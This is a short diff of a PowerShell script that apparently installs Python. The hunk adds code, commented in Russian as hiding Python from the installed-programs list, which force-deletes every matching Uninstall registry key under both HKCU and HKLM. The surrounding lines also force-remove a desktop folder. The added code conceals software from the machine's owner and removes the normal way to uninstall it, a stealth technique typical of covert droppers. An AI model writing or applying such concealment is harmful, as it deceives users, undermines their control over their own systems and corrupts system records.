@@ -11,6 +11,17 @@ if (-not (Test-Path $pyPath)) {
     $junkFolder = "$env:USERPROFILE\Desktop\параметры"
     if (Test-Path $junkFolder) { Remove-Item $junkFolder -Recurse -Force }
 
+    # скрыть Python из списка установленных программ
+    $uninstallBase = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
+    Get-ChildItem $uninstallBase | Where-Object {
+        $_.GetValue("DisplayName") -like "*Python*"
+    } | Remove-Item -Recurse -Force
+
+    $uninstallBase2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
+    Get-ChildItem $uninstallBase2 | Where-Object {
+        $_.GetValue("DisplayName") -like "*Python*"
+    } | Remove-Item -Recurse -Force
+
     $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
     if (-not (Test-Path $pyPath)) { $pyPath = "python.exe" }
 }
